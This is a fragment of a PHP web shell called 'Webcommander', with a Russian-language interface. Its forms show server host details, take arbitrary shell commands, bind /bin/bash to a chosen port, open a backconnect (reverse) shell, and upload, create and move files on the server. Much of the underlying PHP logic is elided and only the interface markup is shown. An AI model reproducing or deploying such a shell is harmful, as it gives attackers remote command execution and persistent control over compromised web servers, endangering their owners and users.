...
?>
 ...
 //--></style>
 <title>Webcommander at <?php echo $_SERVER["HTTP_HOST"]?></title>
 </head>
 <body>
<?php
...
?>
 <table class=e>
  <tr>
   <td rowspan=3><img src=<?php echo $script?>?act=showlogo></td>
   <td><b>Host:</b></td><td class=v><?php echo $_SERVER["HTTP_HOST"]?></td>
  </tr>
  <tr>
   <td><b>IP address:</b></td><td class=v><?php echo $_SERVER["SERVER_ADDR"]?></td>
  </tr>
  <tr>
   <td><b>Software:</b></td><td class=v><?php echo $_SERVER["SERVER_SOFTWARE"]?></td>
  </tr>
 </table>
 <form action=<?php echo $script?> method=GET>
 <b>Команда:</b> <input type=text name=cmd value="<?php echo $cmd?>" size=120>
...
<form action=<?php echo $script?>?act=bindshell method=POST>
<b>Bind /bin/bash at port: </b><input type=text name=port size=8>
<input type=submit value=Bind>
</form>
<form action=<?php echo $script?>?act=backconnect method=POST>
...
?>
 <form action=<?php echo $script?>?act=mass method=POST>
 <table width=700>
 <tr class=e><td colspan=7><b><?php echo $dir?></b></td></tr>
 <tr class=h><td><a href="<?php echo $script?>?dir=<?php echo $back?>"><<</a></td>
...
?>
 ...
 в <input type=text name=to value="<?php echo $dir?>"> <b>]</b>
 <br><input type=submit value=Выполнить>
 </form>
 <form action=<?php echo $script?>?act=mkdir method=POST>
 <b>Создать папку</b><br>
 <input type=text name=dirname size=40>
 <input type=hidden name=dir value="<?php echo $dir?>">
 <input type=submit value=Создать></form>
 <FORM ENCTYPE=multipart/form-data ACTION=<?php echo $script?>?act=touch METHOD=POST>
 <b>Создать пустой файл</b><br>
 <INPUT type=text NAME=file size=40>
 <input type=hidden name=dir value="<?php echo $dir?>">
 <INPUT TYPE=submit VALUE=Создать></FORM>
 <FORM ENCTYPE=multipart/form-data ACTION=<?php echo $script?>?act=upload METHOD=POST>
 <b>Закачать файл</b><br>
 <INPUT NAME=userfile TYPE=file size=40>
 <input type=hidden name=uploaddir value="<?php echo $dir?>">
 <INPUT TYPE=submit VALUE=Отправить></FORM>
 <a href=<?php echo $script?>?act=phpinfo>Phpinfo()</a>
<?php
